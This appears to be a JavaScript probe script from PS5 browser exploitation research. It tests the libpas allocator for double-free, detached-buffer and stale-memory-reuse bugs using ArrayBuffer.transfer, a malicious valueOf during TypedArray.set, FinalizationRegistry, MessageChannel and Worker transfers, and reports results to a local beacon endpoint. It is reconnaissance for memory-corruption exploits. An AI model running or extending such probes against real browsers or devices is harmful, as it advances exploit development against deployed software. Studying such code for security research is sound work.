// p231 — Double-free emptiness counter corruption probe
//
// PS5 libpas: check_deallocation=false, PAS_ENABLE_ASSERT=0
// A double-free silently clears an already-clear alloc bit,
// then decrements num_non_empty_words (potential underflow)
//
// We can't directly double-free from JS, but we can test:
// 1. ArrayBuffer.transfer + neutered buffer GC interaction
// 2. TypedArray.set valueOf detach + GC race
// 3. MessagePort transfer + structured clone double-release
// 4. FinalizationRegistry + explicit detach timing
//
// Beacon prefix: V231-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V231-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  function gcPressure(n) {
    for (var i = 0; i < (n || 20000); i++) new ArrayBuffer(128);
  }

  BS('BOOT');

  // Test A: Transfer + GC double-release attempt
  // transfer() detaches the source buffer immediately
  // If GC also tries to free the backing store, double-free
  try {
    if (typeof ArrayBuffer.prototype.transfer === 'function') {
      var survived = true;
      for (var round = 0; round < 100; round++) {
        var ab = new ArrayBuffer(64);
        var view = new Uint32Array(ab);
        view[0] = 0xAAAAAAAA;

        // Transfer detaches ab, frees backing store
        var ab2 = ab.transfer();

        // ab is now neutered, but the GC might still try to
        // free the original backing store if the destructor runs
        // Force GC while the neutered buffer exists
        gcPressure(5000);

        // Check if ab2 is valid
        var v2 = new Uint32Array(ab2);
        if (v2[0] !== 0xAAAAAAAA) {
          BS('A-CORRUPTION-R' + round + '-' + hex(v2[0]));
          survived = false;
          break;
        }
      }
      if (survived) BS('A-SURVIVED-100');
    } else {
      BS('A-NO-TRANSFER');
    }
  } catch (e) {
    BS('A-CRASH-' + e.message.substring(0, 40));
  }

  // Test B: TypedArray.set with valueOf that detaches source
  // During TypedArray.set, valueOf on an element triggers,
  // which detaches the source buffer via transfer
  try {
    var detachWorked = false;
    var src = new ArrayBuffer(32);
    var srcView = new Float64Array(src);
    srcView[0] = 1.1;
    srcView[1] = 2.2;
    srcView[2] = 3.3;
    srcView[3] = 4.4;

    var dst = new Float64Array(4);

    var evilArray = {
      length: 4,
      0: { valueOf: function() {
        if (!detachWorked && typeof src.transfer === 'function') {
          try {
            src.transfer(); // detach src mid-operation
            detachWorked = true;
          } catch(e) {}
        }
        return 99.99;
      }},
      1: 10, 2: 20, 3: 30
    };

    try {
      dst.set(evilArray);
    } catch (e) {}

    if (detachWorked) {
      // Check if srcView reads show detachment
      try {
        var val = srcView[0];
        if (val === 0) {
          BS('B-DETACHED-ZEROED');
        } else if (isNaN(val)) {
          BS('B-DETACHED-NAN');
        } else {
          BS('B-DETACHED-STALE-' + val.toFixed(2));
        }
      } catch (e) {
        BS('B-DETACHED-THREW');
      }
      gcPressure(10000);
    } else {
      BS('B-NO-DETACH');
    }
  } catch (e) {
    BS('B-ERR-' + e.message.substring(0, 40));
  }

  // Test C: FinalizationRegistry + transfer timing
  // Register a finalizer on an ArrayBuffer, then transfer it
  // The finalizer might try to access the (now-freed) backing store
  try {
    if (typeof FinalizationRegistry === 'function' &&
        typeof ArrayBuffer.prototype.transfer === 'function') {
      var leakedRef = null;
      var finalizerRan = false;

      var registry = new FinalizationRegistry(function(heldValue) {
        finalizerRan = true;
        // heldValue is our WeakRef to the original buffer
        // By the time this runs, the buffer is being collected
        // If transfer already freed the backing store, this is a dangling ref
        BS('C-FINALIZER-RAN');
      });

      for (var round = 0; round < 50; round++) {
        var ab = new ArrayBuffer(128);
        var view = new Uint32Array(ab);
        for (var j = 0; j < view.length; j++) view[j] = 0xCCCCCCCC;

        registry.register(ab, 'buf-' + round);

        // Transfer detaches immediately
        var transferred = ab.transfer();
        ab = null;

        // Allocate replacement in same size class
        var replacement = new ArrayBuffer(128);
        var rv = new Uint32Array(replacement);

        // Check if replacement has stale data from the transferred buffer
        for (var j = 0; j < rv.length; j++) {
          if (rv[j] === 0xCCCCCCCC) {
            BS('C-STALE-R' + round);
            break;
          }
        }

        transferred = null;
        replacement = null;
      }

      // Force GC to run finalizers
      gcPressure(50000);

      if (finalizerRan) {
        BS('C-FINALIZER-CONFIRMED');
      } else {
        BS('C-NO-FINALIZER-YET');
      }
    } else {
      BS('C-MISSING-API');
    }
  } catch (e) {
    BS('C-ERR-' + e.message.substring(0, 40));
  }

  // Test D: Structured clone double-detach via MessageChannel
  // Transfer an ArrayBuffer twice through different ports
  try {
    if (typeof MessageChannel === 'function') {
      var ch1 = new MessageChannel();
      var ch2 = new MessageChannel();
      var ab = new ArrayBuffer(64);
      var view = new Uint32Array(ab);
      view[0] = 0xDDDDDDDD;

      var doubleTransferError = false;

      // First transfer
      try {
        ch1.port1.postMessage(ab, [ab]);
      } catch (e) {
        BS('D-FIRST-TRANSFER-ERR');
      }

      // ab should be neutered now
      // Try to transfer again (should throw, but if it doesn't = double-free)
      try {
        ch2.port1.postMessage(ab, [ab]);
        BS('D-DOUBLE-TRANSFER-OK'); // BAD: means the buffer wasn't properly neutered
      } catch (e) {
        BS('D-DOUBLE-TRANSFER-CAUGHT'); // GOOD: properly caught
        doubleTransferError = true;
      }

      // Check ab state
      if (ab.byteLength === 0) {
        BS('D-NEUTERED');
      } else {
        BS('D-NOT-NEUTERED-' + ab.byteLength);
      }

      ch1.port1.close();
      ch1.port2.close();
      ch2.port1.close();
      ch2.port2.close();
    } else {
      BS('D-NO-MSGCHANNEL');
    }
  } catch (e) {
    BS('D-ERR-' + e.message.substring(0, 40));
  }

  // Test E: Concurrent ArrayBuffer access from Web Worker + main thread
  // Worker detaches buffer via transfer while main thread reads
  try {
    if (typeof Worker === 'function' && typeof Blob === 'function') {
      var workerCode = 'onmessage=function(e){' +
        'var ab=e.data;' +
        'try{postMessage({len:ab.byteLength,ok:true})}' +
        'catch(x){postMessage({err:x.message})}' +
      '}';
      var blob = new Blob([workerCode], {type: 'application/javascript'});
      var url = URL.createObjectURL(blob);
      var worker = new Worker(url);

      var ab = new ArrayBuffer(256);
      var view = new Uint32Array(ab);
      for (var j = 0; j < view.length; j++) view[j] = 0xEEEEEEEE;

      worker.onmessage = function(e) {
        if (e.data.ok) {
          BS('E-WORKER-GOT-' + e.data.len);
        } else {
          BS('E-WORKER-ERR-' + e.data.err);
        }
      };

      // Transfer to worker (detaches from main thread)
      worker.postMessage(ab, [ab]);

      // Main thread: ab should be neutered
      if (ab.byteLength === 0) {
        BS('E-MAIN-NEUTERED');
      } else {
        BS('E-MAIN-NOT-NEUTERED-' + ab.byteLength);
      }

      // Immediately allocate in same size class
      var reuse = new ArrayBuffer(256);
      var rv = new Uint32Array(reuse);
      var foundStale = false;
      for (var j = 0; j < rv.length; j++) {
        if (rv[j] === 0xEEEEEEEE) {
          foundStale = true;
          break;
        }
      }
      if (foundStale) BS('E-STALE-REUSE');
      else BS('E-CLEAN-REUSE');

      setTimeout(function() {
        worker.terminate();
        URL.revokeObjectURL(url);
      }, 500);
    } else {
      BS('E-NO-WORKER');
    }
  } catch (e) {
    BS('E-ERR-' + e.message.substring(0, 40));
  }

  BS('DONE');
})();
